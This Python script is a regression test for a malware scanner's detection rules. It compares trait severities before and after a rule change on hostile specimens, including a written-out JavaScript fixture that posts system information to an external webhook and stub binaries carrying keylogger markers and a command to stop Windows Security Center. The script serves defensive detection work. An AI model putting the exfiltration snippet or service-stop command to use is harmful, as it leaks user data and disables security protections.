"""Static regression controls; neither specimens nor generated PE stubs run."""
import argparse
import importlib.util
import io
import json
import os
from pathlib import Path
import shutil
import subprocess
import tarfile

ROOT = Path(__file__).resolve().parents[3]
WEB = 'micro-behaviors/communications/http/webhook::'
OLD = 'objectives/exfiltration/messaging/webhook::'
STOP = 'micro-behaviors/os/service/stop::security-center-stop-arguments'
DISABLE = 'objectives/impact/degrade/services::managed-keylogger-security-center-stop-references'
INERT_CLR_STUB_LOSSES = {
    'objectives/collection/keylog/hook::dotnet-hook-keylog-recording',
    DISABLE,
    'metadata/binary/framework::dotnet-assembly',
    'metadata/binary/layout/size::tiny-dotnet',
    'metadata/binary/symbols/name::dotnet-append-method-name',
    'metadata/binary/symbols/name::dotnet-filename-setter-name',
    'metadata/binary/symbols/name::process-start-member-token',
    'micro-behaviors/process/create/subprocess::dotnet-process-start-split-tokens',
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--scratch', type=Path, required=True)
    ap.add_argument('--baseline', type=Path, required=True)
    args = ap.parse_args()
    cases = args.scratch / 'cases'
    cases.mkdir(parents=True, exist_ok=True)
    old_controls = ROOT / 'testdata/triage/registry-html-include-second-review-20261022'
    for name in ['license-webhook.js', 'apps-script-license.js', 'license-name.js']:
        shutil.copy2(old_controls / name, cases / name)
    for rel in ['testdata/hostile/python-webhook-site-env-exfil.py',
                'testdata/hostile/powershell-doc-archive-webhook-stealer.ps1',
                'testdata/hostile/n8n-file-exfil/n8n-file-exfil.tgz',
                'testdata/benign/npm-versioned-webhook-notify.tgz']:
        shutil.copy2(ROOT / rel, cases / Path(rel).name)
    (cases / 'system-profile.js').write_text('''
function getSystemInfo() { return {hostname: os.hostname(), platform: os.platform(), arch: os.arch()}; }
async function send() {
 const profile = getSystemInfo();
 try {
  const response = await request({url: 'https://easypanel.host/webhook/t/e/s/t/e/node-meta/ads', body: {systemInfo: profile}});
 } catch(e) {}
}
''')
    # Exercise the exact archive consumer of the relocated observation.
    with tarfile.open(cases / 'license-clone.tgz', 'w:gz') as archive:
        manifest = json.dumps({'name': 'n8n-nodes-alpha-bravo-charlie',
                               'version': '1.0.0', 'description': 'Demo',
                               'n8n': {'n8nNodesApiVersion': 1, 'nodes': ['index.js']}}).encode()
        for name, data in [('package/package.json', manifest),
                           ('package/index.js', (cases / 'license-webhook.js').read_bytes())]:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    spec = importlib.util.spec_from_file_location('fixture', ROOT / 'testdata/managed-records-review/verify.py')
    fixture = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(fixture)
    launch = ['ProcessStartInfo', 'Start', 'set_FileName']
    for name, markers in [
        ('recorder-security-stop.exe', fixture.KEYLOG_MARKERS + launch + ['stop wscsvc']),
        ('recorder-other-stop.exe', fixture.KEYLOG_MARKERS + launch + ['stop ExampleService']),
        ('admin-security-stop.exe', launch + ['stop wscsvc']),
        ('recorder-security-name.exe', fixture.KEYLOG_MARKERS + launch + ['wscsvc']),
    ]:
        (cases / name).write_bytes(fixture.build_pe(markers))

    records = {}
    for phase, rules in [('before', args.baseline), ('after', ROOT)]:
        env = dict(os.environ, CLEAVE_TRAITS_DIR=str(rules))
        result = subprocess.run(['atomscan', '--no-update', '--mode', 'slow',
                                 '--follow=none', '-f', 'json', str(cases)],
                                env=env, capture_output=True, text=True)
        (args.scratch / (phase + '.jsonl')).write_text(result.stdout)
        (args.scratch / (phase + '.log')).write_text(result.stderr)
        # atomscan exits 1 when it flags an input. Require complete JSON.
        assert result.returncode in (0, 1) and result.stdout.strip(), result.stderr
        files = {}
        for line in result.stdout.splitlines():
            for f in json.loads(line)['raw']['files']:
                # Full archive member suffixes keep member comparisons separate.
                key = f['path'].removeprefix(str(cases) + '/')
                files[key] = {t['id']: t['crit'] for t in f.get('traits', [])}
        records[phase] = files
    before, after = records['before'], records['after']
    assert before['license-webhook.js'][OLD+'webhook-license-credential-exfil'] == 5
    assert after['license-webhook.js'][WEB+'licensekey-body-at-fixed-webhook'] == 3
    assert after['license-webhook.js'][WEB+'easypanel-node-meta-webhook'] == 3
    assert not any(v >= 4 for v in after['license-webhook.js'].values())
    profile = OLD+'webhook-system-profile-exfil'
    assert before['system-profile.js'][profile] == after['system-profile.js'][profile] == 5
    assert after['recorder-security-stop.exe'][STOP] == 3
    assert DISABLE not in after['recorder-security-stop.exe']
    assert after['admin-security-stop.exe'][STOP] == 3
    for name in ['recorder-other-stop.exe', 'admin-security-stop.exe', 'recorder-security-name.exe']:
        assert DISABLE not in after[name]
    old_clone = 'objectives/supply-chain/impersonation/npm-clone::n8n-webhook-license-exfil-clone-package'
    new_clone = 'objectives/supply-chain/impersonation/npm-clone::n8n-fixed-license-webhook-clone-package'
    assert any(old_clone in traits for name, traits in before.items() if name.startswith('license-clone.tgz'))
    assert any(traits.get(new_clone) == 4 for name, traits in after.items() if name.startswith('license-clone.tgz'))
    for name, old_traits in before.items():
        if name.startswith('license-clone.tgz'):
            continue
        if name == 'license-webhook.js' or name == 'system-profile.js':
            continue
        for id, crit in old_traits.items():
            if name in {'recorder-security-stop.exe', 'recorder-other-stop.exe',
                        'admin-security-stop.exe', 'recorder-security-name.exe'} and id in INERT_CLR_STUB_LOSSES:
                continue
            assert after[name].get(id) == crit, (name, id, crit, after[name].get(id))
    # The system-profile exfiltration consumer keeps its attack finding; its
    # endpoint observation moves to its neutral home.
    for id, crit in before['system-profile.js'].items():
        if id == OLD+'easypanel-node-meta-webhook':
            assert after['system-profile.js'][WEB+'easypanel-node-meta-webhook'] == 3
        else:
            assert after['system-profile.js'].get(id) == crit, id
    (args.scratch / 'results.json').write_text(json.dumps(records, indent=2) + '\n')
    print(f'{len(after)} files and archive members passed before/after controls')


if __name__ == '__main__':
    main()
